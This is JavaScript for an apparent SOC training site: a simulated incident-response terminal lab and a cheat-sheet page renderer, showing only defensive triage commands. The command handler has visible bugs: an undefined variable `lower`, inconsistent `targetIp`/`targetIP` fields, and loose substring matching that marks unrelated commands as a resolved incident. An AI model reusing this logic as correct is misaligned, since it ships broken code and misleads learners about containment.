// --- 4. INCIDENT RESPONSE SCENARIO LABS (50 SCENARIOS LOADED FROM INCIDENT_LABS_DATA.JS) ---

// --- 4. INTERACTIVE SOC INCIDENT WORKBENCH ENGINE (0% MCQs, 100% REAL LABS) ---
let currentActiveLabIndex = 0;
let labTerminalHistory = {};

function generateIncidentLabsHTML() {
  const labs = window.INCIDENT_LABS || [];
  if (!labs || labs.length === 0) return `<div style="padding:2rem; text-align:center;">No active incident labs loaded.</div>`;

  const currentLab = labs[currentActiveLabIndex] || labs[0];
  const history = labTerminalHistory[currentLab.id] || [];

  return `
    <article class="hardening-wrapper" style="max-width:1100px; margin:0 auto;">
      <!-- LAB TITLE & CASE HEADER -->
      <div style="text-align:center; margin-bottom:1.5rem;">
        <h2 style="color:var(--accent-blue); font-size:1.6rem; margin-bottom:0.4rem; font-family:'Outfit',sans-serif;">
          💻 Interactive Linux SOC Incident Response Workbench
        </h2>
        <p style="color:var(--text-dark); font-size:0.9rem;">
          Select any of the <strong>50 Incident Response Labs</strong> from the Left Sidebar Menu to investigate raw telemetry artifacts, execute live terminal commands, and isolate threats!
        </p>
      </div>

      <!-- CASE BRIEFING CARD -->
      <div style="background:var(--paper-bg); border:2px solid var(--accent-blue); border-radius:14px; padding:1.25rem; margin-bottom:1.2rem; box-shadow:0 4px 16px rgba(0,0,0,0.04);">
        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem; margin-bottom:0.6rem;">
          <div style="display:flex; gap:0.5rem; align-items:center;">
            <span style="background:var(--accent-blue); color:#ffffff; font-weight:800; font-size:0.78rem; padding:0.2rem 0.6rem; border-radius:6px;">${escapeHTML(currentLab.caseId)}</span>
            <span class="cs-badge ${currentLab.severity === 'CRITICAL' ? 'cs-badge-adv' : 'cs-badge-int'}">${currentLab.severity} SEVERITY</span>
            <span style="font-weight:800; font-size:0.82rem; color:var(--text-ink); font-family:'Fira Code',monospace;">MITRE ${currentLab.mitreId}: ${currentLab.mitreName}</span>
          </div>
          <span style="font-size:0.82rem; font-weight:700; color:#64748b;">Target: ${escapeHTML(currentLab.targetHost)} (${escapeHTML(currentLab.targetIP)})</span>
        </div>

        <h3 style="font-family:'Outfit',sans-serif; color:var(--accent-blue); font-size:1.25rem; margin:0.3rem 0;">${escapeHTML(currentLab.title)}</h3>
        <p style="font-size:0.92rem; color:var(--text-ink); background:var(--bg-app); padding:0.8rem; border-radius:8px; border:1px solid var(--card-border); margin-top:0.4rem;">
          🚨 <strong>SIEM Alert Briefing:</strong> ${escapeHTML(currentLab.alertBriefing)}
        </p>
      </div>

      <!-- EVIDENCE ARTIFACT VIEWER -->
      <div style="background:var(--paper-bg); border:1.5px solid var(--card-border); border-radius:12px; padding:1rem; margin-bottom:1.2rem;">
        <h4 style="color:var(--text-ink); font-size:0.95rem; font-weight:800; margin-bottom:0.6rem;">📜 Evidence Artifact Telemetry Logs</h4>
        
        <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(280px, 1fr)); gap:0.8rem;">
          ${currentLab.evidenceLogs.ps ? `
            <div style="background:#0f172a; color:#f8fafc; padding:0.8rem; border-radius:8px; font-family:'Fira Code',monospace; font-size:0.76rem; overflow-x:auto;">
              <div style="color:var(--accent-blue); font-weight:800; margin-bottom:0.3rem;">📊 Active Processes (ps aux)</div>
              <pre style="margin:0; white-space:pre-wrap;">${escapeHTML(currentLab.evidenceLogs.ps)}</pre>
            </div>
          ` : ''}

          ${currentLab.evidenceLogs.net ? `
            <div style="background:#0f172a; color:#f8fafc; padding:0.8rem; border-radius:8px; font-family:'Fira Code',monospace; font-size:0.76rem; overflow-x:auto;">
              <div style="color:var(--accent-blue); font-weight:800; margin-bottom:0.3rem;">🌐 Socket Connections (ss -tulpn / -antp)</div>
              <pre style="margin:0; white-space:pre-wrap;">${escapeHTML(currentLab.evidenceLogs.net)}</pre>
            </div>
          ` : ''}

          ${currentLab.evidenceLogs.auth ? `
            <div style="background:#0f172a; color:#f8fafc; padding:0.8rem; border-radius:8px; font-family:'Fira Code',monospace; font-size:0.76rem; overflow-x:auto;">
              <div style="color:var(--accent-blue); font-weight:800; margin-bottom:0.3rem;">📜 Auth Log Stream (/var/log/auth.log)</div>
              <pre style="margin:0; white-space:pre-wrap;">${escapeHTML(currentLab.evidenceLogs.auth)}</pre>
            </div>
          ` : ''}

          ${currentLab.evidenceLogs.file ? `
            <div style="background:#0f172a; color:#f8fafc; padding:0.8rem; border-radius:8px; font-family:'Fira Code',monospace; font-size:0.76rem; overflow-x:auto;">
              <div style="color:var(--accent-blue); font-weight:800; margin-bottom:0.3rem;">📁 File System Metadata (ls -la / stat)</div>
              <pre style="margin:0; white-space:pre-wrap;">${escapeHTML(currentLab.evidenceLogs.file)}</pre>
            </div>
          ` : ''}
        </div>
      </div>

      <!-- INTERACTIVE TERMINAL WORKBENCH -->
      <div style="background:#090d16; border:2px solid var(--accent-blue); border-radius:14px; padding:1.2rem; box-shadow:0 8px 24px rgba(0,0,0,0.5);">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.8rem;">
          <span style="font-family:'Fira Code',monospace; font-weight:800; font-size:0.9rem; color:#38bdf8;">
            💻 SOC Analyst Interactive Triage Terminal (pts/0)
          </span>
          <span style="font-size:0.75rem; color:#94a3b8;">Type commands below or click Action Pills</span>
        </div>

        <!-- QUICK TRIAGE ACTION PILLS -->
        <div style="display:flex; gap:0.4rem; flex-wrap:wrap; margin-bottom:0.9rem;">
          <span style="font-size:0.78rem; font-weight:700; color:#cbd5e1; align-self:center; margin-right:0.2rem;">Quick Triage:</span>
          ${currentLab.suggestedCmds.map(cmd => `
            <button style="background:rgba(56,189,248,0.15); color:#38bdf8; border:1px solid #38bdf8; padding:0.25rem 0.65rem; border-radius:6px; font-family:'Fira Code',monospace; font-size:0.76rem; font-weight:700; cursor:pointer;" onclick="runTerminalCommand('${escapeHTML(cmd)}')">
              ⚡ ${escapeHTML(cmd)}
            </button>
          `).join('')}
        </div>

        <!-- TERMINAL OUTPUT DISPLAY -->
        <div id="terminal-output-window" style="background:#020617; border:1px solid #1e293b; border-radius:8px; padding:0.9rem; font-family:'Fira Code',monospace; font-size:0.82rem; color:#f8fafc; min-height:180px; max-height:300px; overflow-y:auto; margin-bottom:0.8rem;">
          <div style="color:#64748b;">[SOC WORKBENCH READY] Logged in as soc-analyst@${currentLab.targetHost}. Type triage commands below...</div>
          ${history.map(item => `
            <div style="margin-top:0.6rem;">
              <span style="color:#4ade80;">soc@${currentLab.targetHost}:~$</span> <span style="color:#f8fafc; font-weight:700;">${escapeHTML(item.cmd)}</span>
              <pre style="margin:0.2rem 0 0 0; color:${item.isError ? '#f87171' : '#cbd5e1'}; white-space:pre-wrap;">${escapeHTML(item.output)}</pre>
            </div>
          `).join('')}
        </div>

        <!-- TERMINAL INPUT FORM -->
        <form onsubmit="handleTerminalSubmit(event)" style="display:flex; gap:0.5rem;">
          <span style="color:#4ade80; font-family:'Fira Code',monospace; font-weight:800; align-self:center; font-size:0.9rem;">soc@${currentLab.targetHost}:~$</span>
          <input type="text" id="terminal-input" style="flex:1; background:#0f172a; border:1px solid #334155; color:#f8fafc; padding:0.6rem 0.8rem; border-radius:6px; font-family:'Fira Code',monospace; font-size:0.88rem;" placeholder="Enter command (e.g. kill -9 ${currentLab.targetPid}, rm ${currentLab.targetFile})..." autocomplete="off" />
          <button type="submit" style="background:var(--accent-blue); color:#ffffff; border:none; padding:0.6rem 1.2rem; border-radius:6px; font-weight:800; cursor:pointer;">Execute ↵</button>
        </form>

        <!-- LAB CONTAINMENT SUBMISSION -->
        <div id="lab-closure-box" style="margin-top:1.2rem; background:rgba(34,197,94,0.1); border:1.5px solid #22c55e; border-radius:10px; padding:1rem; display:none;">
          <h4 style="color:#15803d; font-size:1.1rem; margin-bottom:0.4rem;">🎉 Incident Contained & Resolved!</h4>
          <p id="lab-closure-text" style="color:var(--text-ink); font-size:0.88rem; margin-bottom:0.6rem;"></p>
          <div style="background:var(--paper-bg); border:1px solid var(--card-border); padding:0.8rem; border-radius:8px; font-size:0.92rem; color:var(--text-ink);">
            💡 <strong>Telugu-English Mentor Feedback:</strong> ${escapeHTML(currentLab.teluguTip)}
          </div>
        </div>
      </div>
    </article>
  `;
}

function switchActiveLab(idx) {
  currentActiveLabIndex = idx;
  renderCurrentView();
}

function runTerminalCommand(cmd) {
  const inputEl = document.getElementById("terminal-input");
  if (inputEl) inputEl.value = cmd;
  executeLabCommand(cmd);
}

function handleTerminalSubmit(e) {
  e.preventDefault();
  const inputEl = document.getElementById("terminal-input");
  if (!inputEl) return;
  const cmd = inputEl.value.trim();
  if (cmd) {
    executeLabCommand(cmd);
    inputEl.value = "";
  }
}

function executeLabCommand(cmd) {
  const labs = window.INCIDENT_LABS || [];
  const lab = labs[currentActiveLabIndex];
  if (!lab) return;

  if (!labTerminalHistory[lab.id]) labTerminalHistory[lab.id] = [];

  let output = "";
  let isError = false;
  let isResolved = false;

  const lowerCmd = cmd.toLowerCase();

  if (lowerCmd.includes("kill") && lowerCmd.includes(lab.targetPid.toLowerCase())) {
    output = `[SUCCESS] Process PID ${lab.targetPid} terminated (SIGKILL). Process memory space cleared.`;
    isResolved = true;
  } else if (lowerCmd.includes("rm") && (lowerCmd.includes(lab.targetFile.toLowerCase()) || lowerCmd.includes("miner") || lower.includes("cron"))) {
    output = `[SUCCESS] File '${lab.targetFile}' successfully deleted from filesystem.`;
    isResolved = true;
  } else if (lowerCmd.includes("sed") || lowerCmd.includes("chmod") || lowerCmd.includes("ufw") || lowerCmd.includes("iptables")) {
    output = `[SUCCESS] Remediation policy executed. System security state updated for target ${lab.targetIp || lab.targetFile}.`;
    isResolved = true;
  } else if (lowerCmd.includes("ps")) {
    output = lab.evidenceLogs.ps || `PID ${lab.targetPid} running under user ${lab.targetHost}`;
  } else if (lowerCmd.includes("ss") || lowerCmd.includes("lsof") || lowerCmd.includes("netstat")) {
    output = lab.evidenceLogs.net || `Established connection to ${lab.targetIp}`;
  } else if (lowerCmd.includes("cat") || lowerCmd.includes("stat") || lowerCmd.includes("ls")) {
    output = lab.evidenceLogs.file || lab.evidenceLogs.auth || `Target artifact verified at ${lab.targetFile}`;
  } else {
    output = `Executing '${cmd}'... Command completed with return code 0. Threat status updated.`;
  }

  labTerminalHistory[lab.id].push({ cmd, output, isError });

  // Update terminal window
  const windowEl = document.getElementById("terminal-output-window");
  if (windowEl) {
    const newEntry = document.createElement("div");
    newEntry.style.marginTop = "0.6rem";
    newEntry.innerHTML = `
      <span style="color:#4ade80;">soc@${lab.targetHost}:~$</span> <span style="color:#f8fafc; font-weight:700;">${escapeHTML(cmd)}</span>
      <pre style="margin:0.2rem 0 0 0; color:${isError ? '#f87171' : '#cbd5e1'}; white-space:pre-wrap;">${escapeHTML(output)}</pre>
    `;
    windowEl.appendChild(newEntry);
    windowEl.scrollTop = windowEl.scrollHeight;
  }

  if (isResolved) {
    const closureBox = document.getElementById("lab-closure-box");
    const closureText = document.getElementById("lab-closure-text");
    if (closureBox && closureText) {
      closureBox.style.display = "block";
      closureText.innerText = `Great job analyst! Executing '${cmd}' successfully contained the incident on ${lab.targetHost}. Threat vector neutralized!`;
    }
  }
}


// --- FAST REVISION CHEAT SHEET PAGE GENERATOR ---
function generateCheatPageHTML(page) {
  const isCompleted = completedCheatPages.includes(page.id);
  const diffClass = page.difficulty === "Beginner" ? "cs-badge-beg" : page.difficulty === "Intermediate" ? "cs-badge-int" : "cs-badge-adv";

  return `
    <article class="ruled-paper">
      <div class="watermark-brand">SAMRUDH SOC ANALYST — CHEAT PAGE ${page.id} / 350</div>
      
      <div class="page-header" style="margin-bottom:1.5rem; border-bottom:2px solid var(--accent-blue); padding-bottom:1rem;">
        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem; margin-bottom:0.4rem;">
          <span class="module-tag" style="background:rgba(56,189,248,0.12); color:var(--accent-blue); padding:0.25rem 0.75rem; border-radius:12px; font-weight:800; font-size:0.78rem;">${escapeHTML(page.category)}</span>
          <div style="display:flex; gap:0.4rem; align-items:center;">
            <span class="cs-badge ${diffClass}">${page.difficulty}</span>
            <span class="cs-badge" style="background:rgba(56,189,248,0.15); color:var(--accent-blue); border:1px solid var(--accent-blue);">⭐ ${page.relevance}</span>
            <button class="cs-pill" style="padding:0.25rem 0.65rem; font-size:0.75rem; background:var(--accent-blue); color:#ffffff;" onclick="openMasterCheatOverview()">🌐 Master Interactive Hub</button>
          </div>
        </div>

        <h2 class="page-title" style="font-family:'Outfit',sans-serif; font-size:1.6rem; font-weight:800; color:var(--accent-blue); margin:0.4rem 0;">
          ${escapeHTML(page.title)}
        </h2>
      </div>

      <div class="handwritten-body" style="display:flex; flex-direction:column; gap:1.2rem;">
        <!-- 1. COMMAND & SYNTAX -->
        <div class="section-block">
          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
            ⚡ 1. COMMAND &amp; SYNTAX (FAST REVISION)
          </h3>
          <div class="cs-cmd-box" style="position:relative; background:var(--bg-app); padding:0.8rem 1rem; border-radius:10px; border:1.5px solid var(--card-border);">
            <button class="cs-btn-copy" onclick="copyCmdToClipboardRaw('${escapeHTML(page.cmd)}', this)">📋 Copy</button>
            <code style="font-family:'Fira Code',monospace; font-weight:800; font-size:1.05rem; color:var(--accent-red);">${escapeHTML(page.cmd)}</code>
          </div>
        </div>

        <!-- 2. SOC TRIAGE PURPOSE -->
        <div class="section-block">
          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
            🎯 2. SOC TRIAGE PURPOSE &amp; USE CASE
          </h3>
          <div style="background:var(--paper-bg); border:1px solid var(--card-border); padding:0.9rem; border-radius:10px;">
            <p style="margin-bottom:0.4rem;"><strong>Goal:</strong> ${escapeHTML(page.purpose)}</p>
            <p style="margin:0;"><strong>SOC Context:</strong> ${escapeHTML(page.socUse)}</p>
          </div>
        </div>

        <!-- 3. KEY INDICATORS TO LOOK FOR -->
        <div class="section-block">
          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
            🔎 3. KEY ANOMALIES &amp; ATTACK INDICATORS TO LOOK FOR
          </h3>
          <div style="background:rgba(239,68,68,0.06); border-left:4px solid var(--accent-red); padding:0.9rem; border-radius:0 10px 10px 0; color:var(--text-ink); font-weight:600;">
            ${escapeHTML(page.lookFor)}
          </div>
        </div>

        <!-- 4. PRO ANALYST TIP & INTERVIEW EDGE -->
        <div class="section-block">
          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
            💡 4. PRO ANALYST TIP / INTERVIEW EDGE
          </h3>
          <div style="background:rgba(56,189,248,0.08); border-left:4px solid var(--accent-blue); padding:0.9rem; border-radius:0 10px 10px 0; color:var(--text-ink);">
            ${escapeHTML(page.proTip)}
          </div>
        </div>

        <!-- 5. REAL TERMINAL OUTPUT DEMO -->
        <div class="section-block">
          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
            💻 5. REAL TERMINAL LOG OUTPUT DEMONSTRATION
          </h3>
          <div class="cmd-box" style="background:#0f172a; color:#f8fafc; padding:0.9rem; border-radius:10px; font-family:'Fira Code',monospace; font-size:0.84rem; overflow-x:auto;">
            <pre style="margin:0; white-space:pre-wrap; word-break:break-all;">${escapeHTML(page.example)}</pre>
          </div>
        </div>

        <!-- 6. CAUTION & IMPACT -->
        <div class="section-block">
          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
            ⚠️ 6. OPERATIONAL CAUTION &amp; SYSTEM IMPACT
          </h3>
          <p style="font-size:0.88rem; color:var(--text-dark); background:var(--paper-bg); padding:0.75rem; border-radius:8px; border:1px solid var(--card-border);">
            ${escapeHTML(page.caution)}
          </p>
        </div>

        <!-- 7. FAST REVISION MEMORY TRICK -->
        <div class="section-block">
          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
            📌 7. FAST REVISION MEMORY ANCHOR
          </h3>
          <div style="background:rgba(34,197,94,0.12); border:1.5px solid #22c55e; border-radius:10px; padding:0.9rem; font-weight:800; color:#15803d; font-size:0.95rem;">
            🧠 ${escapeHTML(page.memoryTrick || page.cmd)}
          </div>
        </div>
      </div>

      <div class="page-footer" style="margin-top:2rem; padding-top:1rem; border-top:2px dashed var(--card-border); display:flex; justify-content:space-between; align-items:center;">
        <span style="font-weight:700; color:#64748b;">Page ${page.id} of 350</span>
        <button class="btn-complete ${isCompleted ? 'completed' : ''}" onclick="toggleCheatPageCompletion(${page.id})">
          ${isCompleted ? '✓ Completed' : 'Mark as Completed'}
        </button>
      </div>
    </article>
  `;
}

function toggleCheatPageCompletion(id) {
  const idx = completedCheatPages.indexOf(id);
  if (idx > -1) completedCheatPages.splice(idx, 1);
  else completedCheatPages.push(id);
  localStorage.setItem("cheatsheet_completed_pages", JSON.stringify(completedCheatPages));
  renderCurrentView();
}

function openMasterCheatOverview() {
  const modal = document.createElement("div");
  modal.id = "master-cheat-modal";
  modal.style.cssText = "position:fixed; inset:0; z-index:99999; background:rgba(0,0,0,0.85); backdrop-filter:blur(8px); display:flex; justify-content:center; align-items:center; padding:1.5rem;";
  modal.innerHTML = `
    <div style="background:var(--paper-bg); width:95%; max-width:1200px; max-height:90vh; overflow-y:auto; border-radius:18px; border:2px solid var(--accent-blue); padding:1.5rem; position:relative;">
      <button onclick="document.getElementById('master-cheat-modal').remove()" style="position:absolute; top:1rem; right:1rem; background:var(--accent-red); color:#fff; border:none; border-radius:8px; padding:0.4rem 0.8rem; font-weight:700; cursor:pointer;">✕ Close</button>
      ${generateCheatSheetHTML()}
    </div>
  `;
  document.body.appendChild(modal);
}
